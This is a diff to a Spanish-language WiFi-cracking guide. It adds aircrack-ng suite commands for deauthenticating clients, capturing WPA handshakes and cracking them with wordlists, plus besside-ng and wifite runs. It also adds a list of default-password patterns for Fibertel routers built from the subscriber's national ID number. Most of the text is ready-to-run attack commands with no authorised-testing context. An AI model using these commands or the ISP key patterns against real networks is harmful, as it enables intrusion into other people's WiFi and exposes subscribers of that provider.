@@ -411,11 +411,14 @@ cd handshake
 
 Cuando el handshake es capturado se guardará en el directorio en donde estás situado.
 
-### Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake.
+### Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake. (Simultáneamente)
 `aireplay-ng --deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon # donde -a es el SSID y -c es el cliente.`
+
+O podés hacerlo sin el cliente `sin la opción -c`
 
 ### Una vez que capturamos el handshake, intentamos descubrir la contraseña usando un diccionario.
 `aircrack-ng handshake.cap -w passwords.txt`
+
 En KaliLinux hay un diccionario muy conocido que se llama rockyou.txt y otros diccionarios que se pueden ver ejecutando el comando `wordlists`.
 ```
 
@@ -732,9 +735,11 @@ grep -E '\b([^0-9]*[0-9]){4}$[^0-9]*\b' weakpass_4.latin.txt > sanchez_dicc1
 grep -E '^[^0-9]*([0-9]){4}$' sanchez_dicc1 > sanchez_dicc2
 ```
 
+```bash
 aircrack-ng -w sanchez_dicc2 /home/esotericwarfare/Sanchez1/handshake-FE:A0:3F:21:00:91.cap
+```
 
-
+#### Observación
 
 Supongamos que corremos el diccionario de 46 gigabytes o hacemos un ataque de gemelo malvado o hacemos un ataque de WPS o hacemos un ataque de WEP (obsoleto) y encontramos que la contraseña es: sakura2629
 
@@ -752,17 +757,50 @@ Entonces tomamos un diccionario de 46 gigas y aplicamos los siguientes filtros:
 
 Es decir de un diccionario de 46 gigabytes nos quedamos con 3 diccionarios que lo podemos probar en menos de 1 día.
 
+#### Fibertel WiFi xxx
+https://imlauera.github.io/crackear_fibertel/
 
-Fibertel WiFi fjw 
+```bash
+004+DNI
+004+DNI+abc
+004+DNI+w1f1
+004+DNI+xxx
+003+DNI+xxx
+001+DNI+xxx
+002+DNI+xxx
+014+DNI+xxx
+420+DNI+xxx
+412+DNI+xxx
+...
+```
 
-004+DNI+fjw
-003+DNI+fjw
-001+DNI+fjw
-002+DNI+fjw
-014+DNI+fjw
-420+DNI+fjw
-412+DNI+fjw
+
+#### Besside-ng (solo sirve para WPA)
+```bash
+sudo su
+airmon-ng check kill
+airmon-ng start wlp1s0
+airodump-ng wlp1s0
+besside-ng -b BBSID
+``` 
 
 
+#### More hacking
+
+```console
+sudo su
+airmon-ng check kill
+airmon-ng start wlp1s0
+airodump-ng wlp1s0
+sudo airodump-ng -w wificapture -c 11 --bssid ... wlp1s0 # wificapture para capturar el handshake
+sudo aireplay-ng --deauth 0 -a BSSID_NETWORK wlp1s0
+wireshark wificapture-01.cap
+sudo airmon-ng stop wlp1s0 
+```
+
+### wifite
+```bash
+wifite
+```
 
 Saludos, que Dios los bendiga.
